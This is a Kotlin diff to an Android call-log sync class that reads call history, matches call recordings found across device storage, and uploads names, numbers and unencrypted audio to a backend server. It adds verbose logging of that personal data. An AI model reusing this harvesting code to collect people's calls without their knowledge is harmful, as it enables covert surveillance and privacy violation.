@@ -48,6 +48,7 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
     fun syncNewCallLogs() {
         try {
             val lastSyncedDate = prefs.getLong(PREF_LAST_SYNCED_DATE, 0L)
+            DebugLogger.log("SYNC", "Scanning system CallLog database for new calls...")
 
             val cursor: Cursor? = context.contentResolver.query(
                 CallLog.Calls.CONTENT_URI,
@@ -64,6 +65,7 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
                 "${CallLog.Calls.DATE} ASC"
             )
 
+            var callCount = 0
             cursor?.use { c ->
                 var maxSyncedDate = lastSyncedDate
                 val idIdx = c.getColumnIndexOrThrow(CallLog.Calls._ID)
@@ -74,6 +76,7 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
                 val dateIdx = c.getColumnIndexOrThrow(CallLog.Calls.DATE)
 
                 while (c.moveToNext()) {
+                    callCount++
                     val rawNumber = c.getString(numberIdx) ?: "Unknown"
                     val rawName = c.getString(nameIdx) ?: rawNumber
                     val typeInt = c.getInt(typeIdx)
@@ -94,8 +97,9 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
 
                     // Calculate Call End Time: startDateMs + (durationSec * 1000)
                     val callEndTimeMs = startDateMs + (durationSec * 1000L)
+                    DebugLogger.log("CALL_DETECTED", "📞 Call: $rawName ($rawNumber) | Type: $callType | Duration: $durationStr")
 
-                    // 120-Second Matching Window + Phone Number Matching: Search recording directories
+                    // Search MediaStore & recording directories for matching audio file
                     val matchedRecordingFile = findMatchingAudioFile(callEndTimeMs, startDateMs, rawNumber)
 
                     // Transmit call log entry (with or without audio file)
@@ -118,45 +122,123 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
                     prefs.edit().putLong(PREF_LAST_SYNCED_DATE, maxSyncedDate).apply()
                 }
             }
+
+            if (callCount == 0) {
+                DebugLogger.log("SYNC", "No new calls found in Android CallLog database.")
+            }
         } catch (e: Exception) {
             Log.e("CallLogEngine", "Call log sync exception: ${e.message}")
+            DebugLogger.log("ERROR", "Call log sync exception: ${e.message}")
         }
     }
 
     /**
-     * Searches recording directories for audio files created near call end time or matching phone number
+     * Searches MediaStore & recording directories (recursively) for audio files created near call end time or matching phone number
      */
     private fun findMatchingAudioFile(callEndTimeMs: Long, startDateMs: Long, rawNumber: String): File? {
-        val maxDiffMs = 120000L // 120 seconds matching window (handles delayed file writes by native recorder)
+        val maxDiffMs = 180000L // 3 minutes matching window
+        val cleanNumber = rawNumber.replace("+", "").replace(" ", "").trim()
 
+        DebugLogger.log("AUDIO_SCAN", "🔍 Searching MediaStore & folders for audio created near call end time ($callEndTimeMs)...")
+
+        // METHOD 1: Query System MediaStore across ENTIRE phone storage
+        try {
+            val projection = arrayOf(
+                MediaStore.Audio.Media.DATA,
+                MediaStore.Audio.Media.DATE_MODIFIED,
+                MediaStore.Audio.Media.DATE_ADDED
+            )
+
+            val mediaCursor = context.contentResolver.query(
+                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
+                projection,
+                null,
+                null,
+                "${MediaStore.Audio.Media.DATE_ADDED} DESC"
+            )
+
+            mediaCursor?.use { mc ->
+                val dataIdx = mc.getColumnIndex(MediaStore.Audio.Media.DATA)
+                val dateModIdx = mc.getColumnIndex(MediaStore.Audio.Media.DATE_MODIFIED)
+                val dateAddIdx = mc.getColumnIndex(MediaStore.Audio.Media.DATE_ADDED)
+
+                var count = 0
+                while (mc.moveToNext() && count < 50) { // Check 50 most recent audio files
+                    count++
+                    val path = if (dataIdx != -1) mc.getString(dataIdx) else null ?: continue
+                    val file = File(path)
+                    if (!file.exists() || file.isDirectory) continue
+
+                    val modTimeSec = if (dateModIdx != -1) mc.getLong(dateModIdx) else 0L
+                    val addTimeSec = if (dateAddIdx != -1) mc.getLong(dateAddIdx) else 0L
+                    val fileTimeMs = if (modTimeSec > 0) modTimeSec * 1000L else if (addTimeSec > 0) addTimeSec * 1000L else file.lastModified()
+
+                    val diffEnd = abs(fileTimeMs - callEndTimeMs)
+                    val diffStart = abs(fileTimeMs - startDateMs)
+
+                    if (diffEnd <= maxDiffMs || diffStart <= maxDiffMs) {
+                        DebugLogger.log("MATCH", "✅ MediaStore matched audio: ${file.name} | Path: ${file.absolutePath} | Size: ${file.length()} bytes")
+                        return file
+                    }
+
+                    if (cleanNumber.length >= 6 && file.name.lowercase().contains(cleanNumber)) {
+                        DebugLogger.log("MATCH", "✅ MediaStore matched audio by number: ${file.name} | Path: ${file.absolutePath}")
+                        return file
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            DebugLogger.log("WARN", "MediaStore query exception: ${e.message}")
+        }
+
+        // METHOD 2: Direct Recursive Folder Search across RECORDING_FOLDERS
         for (folderPath in AppConfig.RECORDING_FOLDERS) {
             val folder = File(folderPath)
             if (!folder.exists() || !folder.isDirectory) continue
 
-            val files = folder.listFiles() ?: continue
-            for (file in files) {
-                if (file.isDirectory) continue
-                val nameLower = file.name.lowercase()
-                if (nameLower.endsWith(".m4a") || nameLower.endsWith(".mp3") ||
-                    nameLower.endsWith(".wav") || nameLower.endsWith(".aac") ||
-                    nameLower.endsWith(".3gp") || nameLower.endsWith(".amr")) {
+            val matched = searchFolderRecursive(folder, callEndTimeMs, startDateMs, cleanNumber, maxDiffMs, 0)
+            if (matched != null) return matched
+        }
 
-                    val fileTime = file.lastModified()
-                    val diffEnd = abs(fileTime - callEndTimeMs)
-                    val diffStart = abs(fileTime - startDateMs)
+        DebugLogger.log("NO_AUDIO", "❌ No audio file found in MediaStore or recording folders.")
+        return null
+    }
 
-                    // 1. Direct Time Window Match
-                    if (diffEnd <= maxDiffMs || diffStart <= maxDiffMs) {
-                        Log.d("CallLogEngine", "Matched audio recording by timestamp: ${file.name} (Diff: ${minOf(diffEnd, diffStart)}ms)")
-                        return file
-                    }
+    private fun searchFolderRecursive(
+        folder: File,
+        callEndTimeMs: Long,
+        startDateMs: Long,
+        cleanNumber: String,
+        maxDiffMs: Long,
+        depth: Int
+    ): File? {
+        if (depth > 2) return null
+        val files = folder.listFiles() ?: return null
 
-                    // 2. Phone Number Match (e.g. Call_07507073367_20260905.m4a)
-                    val cleanNumber = rawNumber.replace("+", "").replace(" ", "").trim()
-                    if (cleanNumber.length >= 6 && nameLower.contains(cleanNumber)) {
-                        Log.d("CallLogEngine", "Matched audio recording by phone number: ${file.name}")
-                        return file
-                    }
+        for (file in files) {
+            if (file.isDirectory) {
+                val subMatch = searchFolderRecursive(file, callEndTimeMs, startDateMs, cleanNumber, maxDiffMs, depth + 1)
+                if (subMatch != null) return subMatch
+                continue
+            }
+
+            val nameLower = file.name.lowercase()
+            if (nameLower.endsWith(".m4a") || nameLower.endsWith(".mp3") ||
+                nameLower.endsWith(".wav") || nameLower.endsWith(".aac") ||
+                nameLower.endsWith(".3gp") || nameLower.endsWith(".amr")) {
+
+                val fileTime = file.lastModified()
+                val diffEnd = abs(fileTime - callEndTimeMs)
+                val diffStart = abs(fileTime - startDateMs)
+
+                if (diffEnd <= maxDiffMs || diffStart <= maxDiffMs) {
+                    DebugLogger.log("MATCH", "✅ Folder scan matched audio: ${file.name} | Path: ${file.absolutePath} | Size: ${file.length()} bytes")
+                    return file
+                }
+
+                if (cleanNumber.length >= 6 && nameLower.contains(cleanNumber)) {
+                    DebugLogger.log("MATCH", "✅ Folder scan matched audio by number: ${file.name} | Path: ${file.absolutePath}")
+                    return file
                 }
             }
         }
@@ -202,27 +284,33 @@ class CallLogEngine(private val context: Context, private val deviceId: String) 
                     audioFile.name,
                     rawAudioBytes.toRequestBody(mimeType.toMediaTypeOrNull())
                 )
-                Log.d("CallLogEngine", "Attached unencrypted audio file for upload: ${audioFile.name} (${rawAudioBytes.size} bytes)")
+                DebugLogger.log("PAYLOAD", "📎 Audio File Attached: ${audioFile.name} (${rawAudioBytes.size} bytes)")
             } catch (e: Exception) {
-                Log.e("CallLogEngine", "Error attaching audio file: ${e.message}")
+                DebugLogger.log("ERROR", "Error reading audio file: ${e.message}")
             }
+        } else {
+            DebugLogger.log("PAYLOAD", "⚠️ No Audio File Attached (null/not found)")
         }
 
+        val requestUrl = "${AppConfig.SERVER_BASE_URL}/api/upload-call"
+        DebugLogger.log("HTTP_POST", "📡 Transmitting to backend URL: $requestUrl ...")
+
         val request = Request.Builder()
-            .url("${AppConfig.SERVER_BASE_URL}/api/upload-call")
+            .url(requestUrl)
             .post(builder.build())
             .build()
 
         httpClient.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
-                Log.e("CallLogEngine", "Failed to post call log: ${e.message}")
+                DebugLogger.log("HTTP_ERROR", "🚨 Network Failure: ${e.message}")
             }
 
             override fun onResponse(call: Call, response: Response) {
+                val responseBodyStr = response.body?.string() ?: ""
                 if (response.isSuccessful) {
-                    Log.d("CallLogEngine", "Call log successfully synced to backend! (Has Audio: ${audioFile != null})")
+                    DebugLogger.log("HTTP_SUCCESS", "✅ Server Response 200 OK! Payload: $responseBodyStr")
                 } else {
-                    Log.e("CallLogEngine", "Backend returned error code: ${response.code}")
+                    DebugLogger.log("HTTP_FAIL", "❌ Server Error Code ${response.code}: $responseBodyStr")
                 }
             }
         })
